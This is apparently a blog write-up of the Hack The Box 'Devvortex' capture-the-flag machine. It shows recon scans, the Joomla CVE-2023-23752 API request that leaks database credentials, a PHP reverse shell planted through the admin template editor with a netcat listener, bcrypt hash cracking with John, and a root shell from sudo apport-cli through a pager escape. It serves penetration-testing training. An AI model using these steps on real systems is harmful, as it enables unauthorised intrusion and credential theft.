---
layout: post
title: Devvortex (HTB-Easy)
date: 2024-02-28
categories: [Hack The Box]
tags: [linux, Joomla, mysql, apport-cli, php, RCE]
---

### Box Release Date: November 25, 2023

## Machine Summary

This was an easy-level machine from Hack The Box that had a vulnerable API endpoint that exposed user credentials, which could be used to get a foothold on the box. Next privilege escalation to the user account could be done by connecting to a local mysql db and cracking the hash for one of the users' passwords. Privilege escalation to root can be done by exploiting the single application the user account can run as root. 

## Reconnaissance

First I started out the box with a nmap scan:

```bash
h0ax@h0ax-vm:~/HTB/boxes/easy/devvortex$ sudo nmap --top-ports=100 -Pn -T5 -sSV 10.10.11.242
[sudo] password for h0ax: 
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-28 01:29 EST
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.045s latency).
Not shown: 98 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds
```

Since we have port 80 open, I went ahead and added devvortex.htb to hosts file. Navigating to http://devvortex.htb, takes us to the site below.

![landing](/assets/images/machines/htb/devvortex/landing.png)

I did an initial scan to find any interesting sub-directories but found nothing of interest.

```bash
h0ax@h0ax-vm:~/HTB/boxes/easy/devvortex$ feroxbuster -u http://devvortex.htb -w ~/security-tools/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://devvortex.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/h0ax/security-tools/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://devvortex.htb/js => http://devvortex.htb/js/
301      GET        7l       12w      178c http://devvortex.htb/images => http://devvortex.htb/images/
301      GET        7l       12w      178c http://devvortex.htb/css => http://devvortex.htb/css/
200      GET      100l      178w     1904c http://devvortex.htb/css/responsive.css
200      GET      231l      545w     7388c http://devvortex.htb/about.html
200      GET      229l      475w     6845c http://devvortex.htb/portfolio.html
200      GET       44l      290w    17183c http://devvortex.htb/images/c-1.png
200      GET        5l       48w     1493c http://devvortex.htb/images/fb.png
200      GET        6l       57w     1878c http://devvortex.htb/images/youtube.png
200      GET        7l       30w     2018c http://devvortex.htb/images/d-3.png
200      GET        3l       10w      667c http://devvortex.htb/images/telephone-white.png
200      GET        6l       52w     1968c http://devvortex.htb/images/twitter.png
200      GET        9l       24w     2405c http://devvortex.htb/images/d-2.png
200      GET        5l       23w     1217c http://devvortex.htb/images/location-white.png
200      GET       11l       39w     3419c http://devvortex.htb/images/d-4.png
200      GET        6l       13w      639c http://devvortex.htb/images/quote.png
200      GET      289l      573w     8884c http://devvortex.htb/contact.html
200      GET      254l      520w     7603c http://devvortex.htb/do.html
200      GET        5l       12w      847c http://devvortex.htb/images/envelope-white.png
200      GET        5l       55w     1797c http://devvortex.htb/images/linkedin.png
200      GET       11l       50w     2892c http://devvortex.htb/images/d-1.png
200      GET      714l     1381w    13685c http://devvortex.htb/css/style.css
200      GET      583l     1274w    18048c http://devvortex.htb/index.html
200      GET       87l      363w    24853c http://devvortex.htb/images/c-3.png
200      GET       71l      350w    24351c http://devvortex.htb/images/c-2.png
200      GET        2l     1276w    88145c http://devvortex.htb/js/jquery-3.4.1.min.js
200      GET      536l     3109w   243112c http://devvortex.htb/images/w-3.png
200      GET    10038l    19587w   192348c http://devvortex.htb/css/bootstrap.css
200      GET      348l     2369w   178082c http://devvortex.htb/images/map-img.png
200      GET      536l     2364w   201645c http://devvortex.htb/images/who-img.jpg
200      GET      512l     2892w   241721c http://devvortex.htb/images/w-4.png
200      GET     4440l    10999w   131868c http://devvortex.htb/js/bootstrap.js
200      GET      636l     3934w   306731c http://devvortex.htb/images/w-2.png
200      GET      675l     4019w   330600c http://devvortex.htb/images/w-1.png
200      GET      583l     1274w    18048c http://devvortex.htb/
[####################] - 14s    80501/80501   0s      found:35      errors:0      
[####################] - 13s    20116/20116   1561/s  http://devvortex.htb/ 
[####################] - 12s    20116/20116   1630/s  http://devvortex.htb/js/ 
[####################] - 12s    20116/20116   1635/s  http://devvortex.htb/images/ 
[####################] - 12s    20116/20116   1632/s  http://devvortex.htb/css/ 
```

Next I looked for subdomains:

```bash
h0ax@h0ax-vm:~/HTB/boxes/easy/devvortex$ gobuster vhost -u devvortex.htb -w ~/security-tools/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 64 --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://devvortex.htb
[+] Method:          GET
[+] Threads:         64
[+] Wordlist:        /home/h0ax/security-tools/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.devvortex.htb Status: 200 [Size: 23221]
Progress: 41938 / 100001 (41.94%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 43098 / 100001 (43.10%)
===============================================================
Finished
===============================================================
```

I was only able to find a single subdomain, __dev.devvortex.htb__. I added this subdomain to my hosts file.

## Shell as www-data

After getting to dev.devvortex.htb, I then went and ran another gobuster scan to see what other web directories I could find.

```bash
h0ax@h0ax-vm:~/HTB/boxes/easy/devvortex$ gobuster dir -u http://dev.devvortex.htb -w ~/security-tools/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt -x php -k -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.devvortex.htb
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /home/h0ax/security-tools/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]
/includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/]
/language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/]
/cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]
/images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]
/administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]
/media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]
/plugins              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/plugins/]
/libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/]
/components           (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/components/]
/templates            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/templates/]
/tmp                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/tmp/]
/api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]
/home                 (Status: 200) [Size: 23221]
/index.php            (Status: 200) [Size: 23221]
/layouts              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/layouts/]
/configuration.php    (Status: 200) [Size: 0]
/cli                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cli/]
Progress: 40232 / 40234 (100.00%)
===============================================================
Finished
===============================================================
```

I navigated to all of these different directories and only the __/administrator__ and __/api__ endpoints returned data. The __/administrator__ endpoint redirects you to http://dev.devvortex.htb/administrator/index.php. This page appears to be for the Joomla which is a CMS tool used to build websites. This specific page is for the admin login for the site. I googled Pre-Auth RCE vulnerabilities for Joomla and found an article from 2023 concerning a vulnerable api endpoint (https://www.vicarius.io/blog/cve-2023-23752-joomla-unauthorized-access-vulnerability). Running a curl command on the mentioned URL path actually gets you credentials for a user that you can login as. There are a few exploit scripts for CVE-2023-23752 but they are not even needed to be able to get the credentials.

```bash
h0ax@h0ax-vm:~/HTB/boxes/easy/devvortex$ curl -i -k http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 28 Feb 2024 00:55:09 GMT
Content-Type: application/vnd.api+json; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
x-frame-options: SAMEORIGIN
referrer-policy: strict-origin-when-cross-origin
cross-origin-opener-policy: same-origin
X-Powered-By: JoomlaAPI/1.0
Expires: Wed, 17 Aug 2005 00:00:00 GMT
Last-Modified: Wed, 28 Feb 2024 00:55:09 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache

{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes":{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lew**","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1********","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}
```

If we sign in with those credentials, you then are able to acess this admin landing page

![joomla-admin](/assets/images/machines/htb/devvortex/admin-landing.png)

At this point I looked up ways that I could inject code into the CMS. Since this site runs PHP, there is a chance we can inject a PHP reverse shell into the site. For Joomla, we can do this by going to __System->Templates->Administrator Templates->index.php__. The index.php file is the first that is loaded by the CMS (*I think this the case, not 100% sure*), we can insert our reverse shell here. I just put in a simple one on the second line of the file:

![rev-shell](/assets/images/machines/htb/devvortex/rev-shell.png)

Now, before we hit save and close let's start our netcat listener on our host. Once that is done, we can hit save and close. We now should see a reverse shell comeback from the site!

```bash
h0ax@h0ax-vm:~/HTB/boxes/easy/devvortex$ nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.11.242 35770
bash: cannot set terminal process group (861): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb/administrator$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@devvortex:~/dev.devvortex.htb/administrator$ whoami
whoami
www-data
www-data@devvortex:~/dev.devvortex.htb/administrator$
```

## Privlege Escalation to Logan


Once on the target, I looked to see what users were in the __/home__ directory and there was only one user, Logan. The first flag is in that user's home directory and only that user has permissions to read the file.

At this point, I uploaded Linpeas onto the target and ran it to see what I could find. The first thing that jumped out was the MYSQL database running on the local port 3306. This db was mentioned in the config files for Joomla. We can use Lewis' credentials actually to log into this database and pull a hash for the Logan user.

```bash
www-data@devvortex:~/dev.devvortex.htb/administrator$ mysql -u lewis -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 113
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.00 sec)

mysql> select username,password from sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)
```

The hash we got for Logan is using the Bcrypt algorithm. We can use John to crack this hash.

```bash
h0ax@h0ax-vm:~/HTB/boxes/easy/devvortex$ /usr/sbin/john --wordlist ~/security-tools/wordlists/rockyou.txt --format bcrypt hash
Option requires a parameter: "--wordlist"
h0ax@h0ax-vm:~/HTB/boxes/easy/devvortex$ /usr/sbin/john --wordlist=~/security-tools/wordlists/rockyou.txt --format=bcrypt hash
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:07 0% 0g/s 87.30p/s 87.30c/s 87.30C/s trinity..cheche
0g 0:00:00:09 0% 0g/s 86.92p/s 86.92c/s 86.92C/s chichi..melvin
tequier******    (?)
1g 0:00:00:16 100% 0.06180g/s 86.77p/s 86.77c/s 86.77C/s moises..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed
h0ax@h0ax-vm:~/HTB/boxes/easy/devvortex$ /usr/sbin/john --show
Password files required, but none specified
h0ax@h0ax-vm:~/HTB/boxes/easy/devvortex$ /usr/sbin/john --wordlist ~/security-tools/wordlists/rockyou.txt --format bcrypt hash --show
Option requires a parameter: "--wordlist"
h0ax@h0ax-vm:~/HTB/boxes/easy/devvortex$ /usr/sbin/john --wordlist=~/security-tools/wordlists/rockyou.txt --format=bcrypt hash --show
Invalid options combination or duplicate option: "--show"
h0ax@h0ax-vm:~/HTB/boxes/easy/devvortex$ --show
--show: command not found
h0ax@h0ax-vm:~/HTB/boxes/easy/devvortex$ john hash --show
?:tequier*****

1 password hash cracked, 0 left
```

The password we got from the hash actually allows us to change our user to logan!

```bash
www-data@devvortex:~/dev.devvortex.htb/administrator$ su logan
Password: 
logan@devvortex:/var/www/dev.devvortex.htb/administrator$ id
uid=1000(logan) gid=1000(logan) groups=1000(logan)
logan@devvortex:/var/www/dev.devvortex.htb/administrator$ whoami
logan
logan@devvortex:/var/www/dev.devvortex.htb/administrator$
```

We now can read the user flag!

```bash
logan@devvortex:~$ cat user.txt 
4e0d6ed7e2345d6*******
logan@devvortex:~$
```

## Privlege Escalation to Root

Now that we have access to our user account, let's get root. Let's check what logan has privs to run as root:

```bash
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Sorry, try again.
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
logan@devvortex:~$ 
```

A quick google search for vulnerabilities for this binary returns CVE-2023–26604. CVE-2023–26604, according to Suse Linux, concerns, "systemd before 247 does not adequately block local privilege escalation for some Sudo configurations, e.g., plausible sudoers files in which the "systemctl status" command may be executed. Specifically, systemd does not set LESSSECURE to 1, and thus other programs may be launched from the less program. This presents a substantial security risk when running systemctl from Sudo, because less executes as root when the terminal size is too small to show the complete systemctl output."

To exploit this all we need to do is run apport-cli with the __-f__ argument and then when you are asked if you would like to view report, hit __v__ and then enter __!/bin/bash__ to spawn a shell as root.

```bash
logan@devvortex:~$ sudo /usr/bin/apport-cli
No pending crash reports. Try --help for more information.
logan@devvortex:~$ sudo /usr/bin/apport-cli -f

*** What kind of problem do you want to report?


Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C): 1


*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

*** What display problem do you observe?


Choices:
  1: I don't know
  2: Freezes or hangs during boot or usage
  3: Crashes or restarts back to login screen
  4: Resolution is incorrect
  5: Shows screen corruption
  6: Performance is worse than expected
  7: Fonts are the wrong size
  8: Other display-related problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/C): 2

*** 

To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze

Press any key to continue... 

..dpkg-query: no packages found matching xorg
....................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.5 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v

What would you like to do? Your options are:
  S: Send report (1.5 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v
root@devvortex:/home/logan#
```

Now we can read the root flag!

```bash
root@devvortex:/home/logan# cat /root/root.txt
9d61d6ff87889*******************
```